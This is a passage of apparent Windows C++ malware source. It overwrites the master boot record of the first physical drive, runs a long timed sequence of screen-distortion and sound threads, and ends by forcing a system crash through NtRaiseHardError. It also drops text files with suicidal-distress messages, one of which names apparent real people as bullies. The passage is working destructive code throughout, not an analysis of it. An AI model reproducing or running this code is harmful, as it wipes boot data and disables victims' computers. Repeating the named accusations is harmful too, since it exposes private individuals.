				WriteFile(hFile, txtContent, wcslen(txtContent) * sizeof(WCHAR), &writeLen, NULL);
				CloseHandle(hFile);
			}
			HANDLE hFile1 = CreateFileW(L"稀鹽酸こんにちはä¸­æ–‡��锟斤拷.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile != INVALID_HANDLE_VALUE) {
				WCHAR txtContent[] = L"我好傷心，她們每天都在駡我，我沒有辦法了我在内蒙古不過她們被我的家長駡了，但是她們似乎更加肆意妄爲";
				DWORD writeLen;
				WriteFile(hFile1, txtContent, wcslen(txtContent) * sizeof(WCHAR), &writeLen, NULL);
				CloseHandle(hFile1);
			}
			HANDLE hFile2 = CreateFileW(L"难过，伤心，想死!!!!!.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile != INVALID_HANDLE_VALUE) {
				WCHAR txtContent[] = L"我每天看到她们的嘴脸我就害怕我好伤心，请记住她们的名字，尹佐丹文，李彦妮....";
				DWORD writeLen;
				WriteFile(hFile2, txtContent, wcslen(txtContent) * sizeof(WCHAR), &writeLen, NULL);
				CloseHandle(hFile2);
			}
			const CHAR MasterBootRecord[512] = {
0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0, 0xBC, 0x00, 0x7C,
0xFB, 0xB0, 0x13, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xFF, 0x0F, 0x31, 0xAA, 0x81,
0xFF, 0x00, 0xFA, 0x75, 0xF7, 0xB4, 0x01, 0xCD, 0x16, 0x75, 0x02, 0xEB, 0xED, 0x31, 0xC0, 0xCD,
0x16, 0xF4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA,
			};
			DWORD dwBytesWritten;
			HANDLE hDevice = CreateFileW(
				L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
				FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
				OPEN_EXISTING, 0, 0);
			WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
			CloseHandle(hDevice);
			std::srand(static_cast<unsigned int>(std::time(nullptr)));
			Sleep(6000);
			HANDLE hThread4 = CreateThread(NULL, 0, gnb, NULL, 0, NULL);
			Sleep(1500);
			ShellExecuteW(NULL, L"open", L"æ¯”è¾ƒè¾“å…¥çš„éªŒè¯ç å’Œå®žé™…ç”Ÿæˆçš„éªŒè¯ç æ˜¯å¦ç›¸å.txt", NULL, NULL, SW_SHOWNORMAL);
			show();
			HANDLE hThread0 = CreateThread(NULL, 0, o0234, NULL, 0, NULL);
			HANDLE thread0 = CreateThread(0, 0, curr2, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, p34, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, balls, 0, 0, 0);
			HANDLE thread1dot2 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread1dot3 = CreateThread(0, 0, d, 0, 0, 0);
			HANDLE thread1dot4 = CreateThread(0, 0, qr, 0, 0, 0);
			HANDLE thread1dot5 = CreateThread(0, 0, i07, 0, 0, 0);
			HANDLE thread1dot6 = CreateThread(0, 0, icons, 0, 0, 0);
			HANDLE hThread3 = CreateThread(NULL, 0, MouseMoveThread, NULL, 0, NULL);//鼠标瞬移
			HANDLE hThread2 = CreateThread(NULL, 0, system32, NULL, 0, NULL);//打开此电脑，文件等...
			ShellExecuteW(NULL, L"open", L"稀鹽酸こんにちはä¸­æ–‡��锟斤拷.txt", NULL, NULL, SW_SHOWNORMAL);
			ShellExecuteW(NULL, L"open", L"难过，伤心，想死!!!!!.txt", NULL, NULL, SW_SHOWNORMAL);
			sound1();
			Sleep(30000);
			HANDLE thread2 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, d, 0, 0, 0);
			HANDLE thread2dot2 = CreateThread(0, 0, i07, 0, 0, 0);
			HANDLE hThread6 = CreateThread(NULL, 0, o01, NULL, 0, NULL);
			sound21();
			Sleep(15000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			TerminateThread(thread2dot2, 0);
			CloseHandle(thread2dot2);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			TerminateThread(thread1dot1, 0);
			TerminateThread(thread1dot2, 0);
			TerminateThread(thread1dot3, 0);
			TerminateThread(thread1dot4, 0);
			TerminateThread(thread1dot5, 0);
			TerminateThread(thread1dot6, 0);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, p34, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, sr200, 0, 0, 0);
			HANDLE thread3dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			HANDLE thread3dot3 = CreateThread(0, 0, d, 0, 0, 0);
			HANDLE thread3dot4 = CreateThread(0, 0, C02034d, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread3dot1);
			TerminateThread(thread3dot2, 0);
			CloseHandle(thread3dot2);
			TerminateThread(thread3dot3, 0);
			CloseHandle(thread3dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread4dot2 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread4dot3 = CreateThread(0, 0, swirl, 0, 0, 0);
			HANDLE thread4dot4 = CreateThread(0, 0, p34, 0, 0, 0);
			HANDLE thread4dot5 = CreateThread(0, 0, icons, 0, 0, 0);
			HANDLE thread100 = CreateThread(0, 0, E02034d, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			TerminateThread(thread4dot1, 0);
			CloseHandle(thread4dot1);
			TerminateThread(thread4dot2, 0);
			CloseHandle(thread4dot2);
			TerminateThread(thread4dot3, 0);
			CloseHandle(thread4dot3);
			TerminateThread(thread4dot4, 0);
			CloseHandle(thread4dot4);
			TerminateThread(thread4dot5, 0);
			CloseHandle(thread4dot5);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, swirl, 0, 0, 0);
			HANDLE thread5dot1 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread5dot2 = CreateThread(0, 0, icons, 0, 0, 0);
			HANDLE thread101 = CreateThread(0, 0, D02034d, 0, 0, 0);
			sound4();
			Sleep(10000);
			HANDLE thread6 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, p34, 0, 0, 0);
			Sleep(10000);
			TerminateThread(thread5dot1, 0);
			CloseHandle(thread5dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, d10, 0, 0, 0);
			Sleep(10000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			TerminateThread(thread5dot1, 0);
			CloseHandle(thread5dot1);
			TerminateThread(thread5dot2, 0);
			CloseHandle(thread5dot2);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			TerminateThread(thread6dot1, 0);
			CloseHandle(thread6dot1);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			Sleep(10);
			HANDLE thread8 = CreateThread(0, 0, swirl, 0, 0, 0);
			HANDLE thread8dot1 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread8dot2 = CreateThread(0, 0, p34, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			TerminateThread(thread8dot1, 0);
			CloseHandle(thread8dot1);
			TerminateThread(thread8dot2, 0);
			CloseHandle(thread8dot2);
			InvalidateRect(0, 0, 0);
			Sleep(50);
			HANDLE thread9 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread9dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			HANDLE thread9dot3 = CreateThread(0, 0, S, 0, 0, 0);
			sound5();
			Sleep(15000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			TerminateThread(thread9dot1, 0);
			CloseHandle(thread9dot1);
			TerminateThread(thread9dot2, 0);
			CloseHandle(thread9dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread10dot1 = CreateThread(0, 0, rd600, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			TerminateThread(thread10dot1, 0);
			CloseHandle(thread10dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread11 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread11dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread11dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			TerminateThread(thread11dot1, 0);
			CloseHandle(thread11dot1);
			TerminateThread(thread11dot2, 0);
			CloseHandle(thread11dot2);
			TerminateThread(thread9dot3, 0);
			CloseHandle(thread9dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread12 = CreateThread(0, 0, drawEllipse, 0, 0, 0);
			HANDLE thread12dot1 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread12dot2 = CreateThread(0, 0, sr200, 0, 0, 0);
			HANDLE thread12dot3 = CreateThread(0, 0, shader15, 0, 0, 0);
			sound9();
			Sleep(8000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			TerminateThread(thread12dot1, 0);
			CloseHandle(thread12dot1);
			TerminateThread(thread12dot2, 0);
			CloseHandle(thread12dot2);
			TerminateThread(thread12dot3, 0);
			CloseHandle(thread12dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread13 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread13dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread13dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			HANDLE thread13dot3 = CreateThread(0, 0, rd600, 0, 0, 0);
			Sleep(10000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			TerminateThread(thread13dot1, 0);
			CloseHandle(thread13dot1);
			TerminateThread(thread13dot2, 0);
			CloseHandle(thread13dot2);
			TerminateThread(thread13dot3, 0);
			CloseHandle(thread13dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread14 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread14dot1 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread14dot2 = CreateThread(0, 0, swirl, 0, 0, 0);
			Sleep(12000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			TerminateThread(thread14dot1, 0);
			CloseHandle(thread14dot1);
			TerminateThread(thread14dot2, 0);
			CloseHandle(thread14dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread15 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread15dot1 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread15dot2 = CreateThread(0, 0, swirl, 0, 0, 0);
			sound10();
			Sleep(11000);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			TerminateThread(thread15dot1, 0);
			CloseHandle(thread15dot1);
			TerminateThread(thread15dot2, 0);
			CloseHandle(thread15dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread16 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread16dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread16dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			HANDLE thread16dot3 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread16dot4 = CreateThread(0, 0, d03, 0, 0, 0);
			HANDLE thread16dot5 = CreateThread(0, 0, p34, 0, 0, 0);
			Sleep(19000);
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			TerminateThread(thread16dot1, 0);
			CloseHandle(thread16dot1);
			TerminateThread(thread16dot2, 0);
			CloseHandle(thread16dot2);
			TerminateThread(thread16dot3, 0);
			CloseHandle(thread16dot3);
			TerminateThread(thread16dot4, 0);
			CloseHandle(thread16dot4);
			TerminateThread(thread16dot5, 0);
			CloseHandle(thread16dot5);
			InvalidateRect(0, 0, 0);
			HANDLE thread17 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread17dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread17dot2 = CreateThread(0, 0, sr400, 0, 0, 0);
			HANDLE thread17dot3 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread17dot4 = CreateThread(0, 0, d03, 0, 0, 0);
			HANDLE thread17dot5 = CreateThread(0, 0, p34, 0, 0, 0);
			sound13();
			Sleep(5000);
			TerminateThread(thread17, 0);
			CloseHandle(thread17);
			TerminateThread(thread17dot1, 0);
			CloseHandle(thread17dot1);
			TerminateThread(thread17dot2, 0);
			CloseHandle(thread17dot2);
			TerminateThread(thread17dot3, 0);
			CloseHandle(thread17dot3);
			TerminateThread(thread17dot4, 0);
			CloseHandle(thread17dot4);
			TerminateThread(thread17dot5, 0);
			CloseHandle(thread17dot5);
			InvalidateRect(0, 0, 0);
			HANDLE thread18 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread18dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread18dot2 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread18dot3 = CreateThread(0, 0, d00, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			TerminateThread(thread18dot1, 0);
			CloseHandle(thread18dot1);
			TerminateThread(thread18dot2, 0);
			CloseHandle(thread18dot2);
			TerminateThread(thread18dot3, 0);
			CloseHandle(thread18dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread19 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread19dot1 = CreateThread(0, 0, sr300, 0, 0, 0);
			HANDLE thread19dot2 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread19dot3 = CreateThread(0, 0, d10, 0, 0, 0);
			Sleep(10000);
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			TerminateThread(thread19dot1, 0);
			CloseHandle(thread19dot1);
			TerminateThread(thread19dot2, 0);
			CloseHandle(thread19dot2);
			TerminateThread(thread19dot3, 0);
			CloseHandle(thread19dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread20 = CreateThread(0, 0, p34, 0, 0, 0);
			HANDLE thread20dot1 = CreateThread(0, 0, balls, 0, 0, 0);
			HANDLE thread20dot2 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread20dot3 = CreateThread(0, 0, d, 0, 0, 0);
			HANDLE thread20dot4 = CreateThread(0, 0, qr, 0, 0, 0);
			HANDLE thread20dot5 = CreateThread(0, 0, i07, 0, 0, 0);
			HANDLE thread20dot6 = CreateThread(0, 0, icons, 0, 0, 0);
			sound16();
			Sleep(10000);
			TerminateThread(thread20, 0);
			CloseHandle(thread20);
			TerminateThread(thread20dot3, 0);
			CloseHandle(thread20dot3);
			TerminateThread(thread20dot4, 0);
			CloseHandle(thread20dot4);
			TerminateThread(thread20dot5, 0);
			CloseHandle(thread20dot5);
			InvalidateRect(0, 0, 0);
			HANDLE thread21 = CreateThread(0, 0, Dle, 0, 0, 0);
			Sleep(30000);
			HANDLE thread22 = CreateThread(0, 0, swirl, 0, 0, 0);
			HANDLE thread22dot1 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread22dot2 = CreateThread(0, 0, shader5, 0, 0, 0);
			sound15();
			Sleep(36000);
			TerminateThread(thread21, 0);
			CloseHandle(thread21);
			TerminateThread(thread22, 0);
			CloseHandle(thread22);
			TerminateThread(thread22dot1, 0);
			CloseHandle(thread22dot1);
			TerminateThread(thread22dot2, 0);
			CloseHandle(thread22dot2);
			TerminateThread(thread20dot1, 0);
			CloseHandle(thread20dot1);
			TerminateThread(thread20dot2, 0);
			CloseHandle(thread20dot2);
			TerminateThread(thread20dot6, 0);
			CloseHandle(thread20dot6);
			InvalidateRect(0, 0, 0);
			HANDLE thread23 = CreateThread(0, 0, FCD, 0, 0, 0);
			HANDLE thread23dot1 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread23dot2 = CreateThread(0, 0, balls, 0, 0, 0);
			HANDLE thread23dot3 = CreateThread(0, 0, qu0517, 0, 0, 0);
			sound22();
			Sleep(10000);
			TerminateThread(thread23, 0);
			CloseHandle(thread23);
			InvalidateRect(0, 0, 0);
			HANDLE thread24 = CreateThread(0, 0, p34, 0, 0, 0);
			Sleep(10000);
			TerminateThread(thread24, 0);
			TerminateThread(thread23dot1, 0);
			CloseHandle(thread23dot1);
			TerminateThread(thread23dot2, 0);
			CloseHandle(thread23dot2);
			TerminateThread(thread23dot3, 0);
			CloseHandle(thread23dot3);
			InvalidateRect(0, 0, 0);
			HANDLE thread25 = CreateThread(0, 0, p34, 0, 0, 0);
			HANDLE thread25dot1 = CreateThread(0, 0, balls, 0, 0, 0);
			HANDLE thread25dot2 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread25dot3 = CreateThread(0, 0, d, 0, 0, 0);
			HANDLE thread25dot4 = CreateThread(0, 0, qr, 0, 0, 0);
			HANDLE thread25dot5 = CreateThread(0, 0, i07, 0, 0, 0);
			HANDLE thread25dot6 = CreateThread(0, 0, icons, 0, 0, 0);
			Sleep(10000);
			InvalidateRect(0, 0, 0);
			HANDLE thread26 = CreateThread(0, 0, d, 0, 0, 0);
			HANDLE thread26dot1 = CreateThread(NULL, 0, icons, NULL, 0, NULL);
			HANDLE thread26dot2 = CreateThread(0, 0, rd600, 0, 0, 0);
			sound2();
			Sleep(30000);
			HANDLE thread27 = CreateThread(0, 0, FadeThread, 0, 0, 0);
			HANDLE thread27dot1 = CreateThread(NULL, 0, icons, NULL, 0, NULL);
			HANDLE thread27dot2 = CreateThread(NULL, 0, Tam, NULL, 0, NULL);
			HANDLE thread27dot3 = CreateThread(NULL, 0, p34, NULL, 0, NULL);
			TerminateThread(thread25, 0);
			CloseHandle(thread25);
			TerminateThread(thread25dot1, 0);
			CloseHandle(thread25dot1);
			TerminateThread(thread25dot2, 0);
			CloseHandle(thread25dot2);
			TerminateThread(thread25dot6, 0);
			CloseHandle(thread25dot6);
			TerminateThread(thread25dot3, 0);
			CloseHandle(thread25dot3);
			TerminateThread(thread25dot4, 0);
			CloseHandle(thread25dot4);
			TerminateThread(thread25dot5, 0);
			CloseHandle(thread25dot5);
			InvalidateRect(0, 0, 0);
			sound19();
			Sleep(15000);
			HANDLE thread28 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread28dot1 = CreateThread(0, 0, d, 0, 0, 0);
			HANDLE thread28dot2 = CreateThread(0, 0, i07, 0, 0, 0);
			Sleep(10000);
			TerminateThread(thread26, 0);
			CloseHandle(thread26);
			TerminateThread(thread26dot1, 0);
			CloseHandle(thread26dot1);
			TerminateThread(thread26dot2, 0);
			CloseHandle(thread26dot2);
			CloseHandle(thread27);
			TerminateThread(thread27, 0);
			TerminateThread(thread27dot1, 0);
			TerminateThread(thread27dot2, 0);
			TerminateThread(thread27dot3, 0);
			CloseHandle(thread27dot1);
			CloseHandle(thread27dot2);
			CloseHandle(thread27dot3);
			InvalidateRect(0, 0, 0);
			Sleep(6000);
			HANDLE thread29 = CreateThread(0, 0, p34, 0, 0, 0);
			HANDLE thread29dot1 = CreateThread(0, 0, balls, 0, 0, 0);
			HANDLE thread29dot2 = CreateThread(0, 0, rd600, 0, 0, 0);
			HANDLE thread29dot3 = CreateThread(0, 0, d, 0, 0, 0);
			HANDLE thread29dot4 = CreateThread(0, 0, qr, 0, 0, 0);
			HANDLE thread29dot5 = CreateThread(0, 0, i07, 0, 0, 0);
			HANDLE thread29dot6 = CreateThread(0, 0, icons, 0, 0, 0);
			sound22();
			Sleep(20000);
			TerminateThread(thread28, 0);
			CloseHandle(thread28);
			TerminateThread(thread28dot1, 0);
			CloseHandle(thread28dot1);
			TerminateThread(thread28dot2, 0);
			CloseHandle(thread28dot2);
			TerminateThread(thread29, 0);
			CloseHandle(thread29);
			TerminateThread(thread29dot1, 0);
			CloseHandle(thread29dot1);
			TerminateThread(thread29dot2, 0);
			CloseHandle(thread29dot2);
			TerminateThread(thread29dot6, 0);
			CloseHandle(thread29dot6);
			TerminateThread(thread29dot3, 0);
			CloseHandle(thread29dot3);
			TerminateThread(thread29dot4, 0);
			CloseHandle(thread29dot4);
			TerminateThread(thread29dot5, 0);
			CloseHandle(thread29dot5);
			InvalidateRect(0, 0, 0);
			HANDLE thread30 = CreateThread(0, 0, p34, 0, 0, 0);
			HANDLE thread30dot1 = CreateThread(0, 0, d03, 0, 0, 0);
			HANDLE thread30dot2 = CreateThread(0, 0, d1985, 0, 0, 0);
			HANDLE thread30dot3 = CreateThread(0, 0, last, 0, 0, 0);
			sound11();
			Sleep(10000);
			HANDLE hThread5 = CreateThread(NULL, 0, o001, NULL, 0, NULL);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}